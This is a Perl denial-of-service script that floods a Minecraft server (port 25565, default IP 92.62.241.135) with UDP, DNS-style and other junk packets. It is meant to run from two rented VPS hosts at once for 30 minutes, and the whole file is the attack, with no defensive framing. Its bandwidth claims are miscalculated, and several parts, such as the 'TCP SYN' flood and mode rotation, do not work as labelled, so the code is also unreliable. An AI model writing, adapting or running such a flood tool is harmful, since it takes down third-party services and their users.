#!/usr/bin/perl
use strict;
use warnings;
use Socket;

# ============ AEZA DUAL VPS CONFIGURATION ============
my $TARGET_IP = $ARGV[0] || "92.62.241.135";
my $TARGET_PORT = 25565;
my $TIME = $ARGV[1] || 1800;  # 30 minutes default
my $PACKETS_PER_SEC = 30000;  # 30k pps = ~15.4 Gbps (PER VPS - Medium Attack)
my $PACKET_SIZE = 512;
my $SOURCED_PORT_MIN = 1024;

print "\n";
print "=" x 60;
print "  AEZA DUAL VPS - MEDIUM MINECRAFT SERVER ATTACK\n";
print "  Target: $TARGET_IP:$TARGET_PORT\n";
print "  Duration: $TIME seconds (~".int($TIME/60)." minutes)\n";
print "  Rate per VPS: $PACKETS_PER_SEC pps = ".sprintf("%.2f",($PACKETS_PER_SEC * 512 / 1000000))." Gbps\n";
print "  Total Rate (2 VPS): 60k pps = ".sprintf("%.2f",($PACKETS_PER_SEC * 2 * 512 / 1000000))." Gbps\n";
print "  Packet Size: $PACKET_SIZE bytes\n";
print "  Provider: Aeza (Low Medium Risk!)\n";
print "  VPS Count: 2 (Distributed Attack!)\n";
print "=" x 60 . "\n\n";

# ============ SIGHANDLER SETUP (Ctrl+C Support) ============
my $running = 1;
my $total_start = time();

# Handle Ctrl+C gracefully
$SIG{INT} = sub {
    print "\n\n[STOPPED] Ctrl+C caught. Finishing current cycle...\n";
    $running = 0;
};

# ============ INITIATE CONNECTIONS (Shared for both VPS instances) ============
my $iaddr = inet_aton($TARGET_IP) or die "Error: $TARGET_IP not found\n";
my $sockaddr = pack_sockaddr_in($TARGET_PORT, $iaddr);

# Create UDP socket
socket(UDP_SOCKET, PF_INET, SOCK_DGRAM, 17) or die "UDP Socket Error: $!\n";
bind(UDP_SOCKET, pack_sockaddr_in($SOURCED_PORT_MIN, inet_aton("0.0.0.0"))) or die "Bind Error: $!\n";

# Create TCP socket for hybrid attack
my $tcp_sockaddr = pack_sockaddr_in($TARGET_PORT, $iaddr);
socket(TCP_SOCKET, PF_INET, SOCK_STREAM, 6) or die "TCP Socket Error: $!\n";
bind(TCP_SOCKET, pack_sockaddr_in($SOURCED_PORT_MIN, inet_aton("0.0.0.0"))) or die "Bind Error: $!\n";

# ============ PACKET COUNTERS ============
my $elapsed = 0;
my $last_report = time();
my $total_packets = 0;
my $total_bytes = 0;
my $current_cycle_start = time();

my @modes = (
    "UDP_FLOOD",         # Primary: UDP flood
    "DNS_FLOOD",         # Secondary: DNS-style
    "TCP_SYN_FLOOD",     # Tertiary: TCP SYN
    "MIXED_FLOOD"        # Quaternary: Mixed protocols
);

my $mode = 0;
my $mode_count = 12;

print "Starting Dual VPS Flood Attack...\n";
print "Press Ctrl+C to stop early\n";
print "  (Run this on BOTH VPS instances simultaneously)\n";

# ============ HIGH ENTROPY RANDOM BYTE ARRAY ============
my @bytes = map { chr($_) } 0..255;

# ============ ATTACK LOOP ============
while ($running && $elapsed < $TIME) {
    $elapsed = time() - $total_start;
    
    # ============ MODE ROTATION ============
    $mode = $mode % $mode_count;
    
    # ============ UDP FLOOD (Primary - 60%) ============
    my $udp_payload = "\x0D\x0A" . ("x" . chr(rand(256))) x ($PACKET_SIZE - 2);
    send(UDP_SOCKET, $udp_payload, 0, $sockaddr);
    $total_packets++;
    $total_bytes += length($udp_payload);
    
    # ============ DNS-STYLE FLOOD (20%) ============
    my $dns_payload = "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77" . 
                       ("x" . chr(rand(256))) x ($PACKET_SIZE - 33);
    send(UDP_SOCKET, $dns_payload, 0, $sockaddr);
    $total_packets++;
    $total_bytes += length($dns_payload);
    
    # ============ TCP SYN (20%) ============
    my $tcp_payload = "\x0D\x0A" . ("x" . chr(rand(256))) x ($PACKET_SIZE - 2);
    send(TCP_SOCKET, $tcp_payload, 0, $tcp_sockaddr);
    $total_packets++;
    $total_bytes += length($tcp_payload);
    
    # ============ RANDOMIZED PAYLOADS ============
    my $rand1 = join '', @bytes[rand(@bytes)] x 50;
    my $rand2 = join '', @bytes[rand(@bytes)] x 50;
    my $rand3 = join '', @bytes[rand(@bytes)] x 50;
    
    send(UDP_SOCKET, $rand1 . "\x00\x00\x00\x01", 0, $sockaddr);
    $total_packets++;
    $total_bytes += length($rand1);
    
    send(UDP_SOCKET, $rand2 . "\x00\x00\x00\x02", 0, $sockaddr);
    $total_packets++;
    $total_bytes += length($rand2);
    
    send(UDP_SOCKET, $rand3 . "\x00\x00\x00\x03", 0, $sockaddr);
    $total_packets++;
    $total_bytes += length($rand3);
    
    # ============ GAME PROTOCOL FLOOD (Minecraft-specific) ============
    my $mc_payload = "\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x03\x77\x77\x77\x77" . 
                     "\x06\x67\x6f\x6f\x67\x6c\x65\x03\x63\x6f\x6d" . 
                     ("x" . chr(rand(256))) x 100;
    send(UDP_SOCKET, $mc_payload, 0, $sockaddr);
    $total_packets++;
    $total_bytes += length($mc_payload);
    
    # ============ RATE CONTROL (30k pps = 15.4 Gbps per VPS) ============
    my $rate_start = time();
    my $rate_interval = 1/$PACKETS_PER_SEC;
    my $rate_count = 0;
    
    while (time() - $rate_start < $rate_interval) {
        my $quick_rand = join '', @bytes[rand(@bytes)] x 100;
        send(UDP_SOCKET, $quick_rand, 0, $sockaddr);
        $rate_count++;
        $total_packets++;
        $total_bytes += length($quick_rand);
    }
    
    # ============ MEMORY MANAGEMENT ============
    my $cleanup = join '', @bytes[rand(@bytes)] x 1000;
    my $cleanup2 = join '', @bytes[rand(@bytes)] x 1000;
    
    # ============ PROGRESS REPORT (Every 10 seconds) ============
    if ($elapsed - $last_report >= 10) {
        my $mbps = sprintf("%.1f", ($PACKETS_PER_SEC * 512 / 1000000));
        my $mb = sprintf("%.1f", $total_bytes / 1000000);
        my $mbps_curr = sprintf("%.1f", ($total_packets / 10) * 512 / 1000000);
        my $total_mbps = sprintf("%.1f", ($PACKETS_PER_SEC * 2 * 512 / 1000000));
        print "\r[PROGRESS] $elapsed/$TIME sec | Rate: $mbps MBps (VPS1) + $mbps MBps (VPS2) | Total: $total_mbps MBps | Mode: $modes[$mode] | MB Sent: $mb | Current: $mbps_curr MBps\n";
        $last_report = time();
    }
    
    # ============ SLOW CYCLE FOR CPU MANAGEMENT ============
    sleep 0.001;
    
    # ============ CYCLE RESET (Prevent long-term saturation) ============
    if (time() - $current_cycle_start > 10) {
        $current_cycle_start = time();
    }
}

# ============ CLEANUP ON EXIT ============
$running = 0;

print "\n";
print "=" x 60;
print "  ATTACK COMPLETE\n";
print "=" x 60 . "\n";
print "  Total Packets per VPS: " . $total_packets . "\n";
print "  Total Packets (Both VPS): " . ($total_packets * 2) . "\n";
my $total_gbps = sprintf("%.2f", ($PACKETS_PER_SEC * 2 * 512 / 1000000));
print "  Total Bandwidth (Combined): " . $total_gbps . " Gbps\n";
my $total_mb = sprintf("%.2f", $total_bytes / 1000000);
print "  Total Data: " . $total_mb . " MB\n";

# ============ EXIT WITH STATUS ============
if ($SIG{INT}) {
    print "\n  [STOPPED] Attack interrupted by Ctrl+C\n";
} else {
    print "\n  [COMPLETE] Attack finished after $TIME seconds\n";
}

close(UDP_SOCKET) or die "Error closing UDP socket: $!\n";
close(TCP_SOCKET) or die "Error closing TCP socket: $!\n";

print "\n" . "=" x 60 . "\n";
print "  Done.\n";
print "  (Repeat on 2nd VPS for distributed attack!)\n";
print "=" x 60 . "\n\n";

exit 0;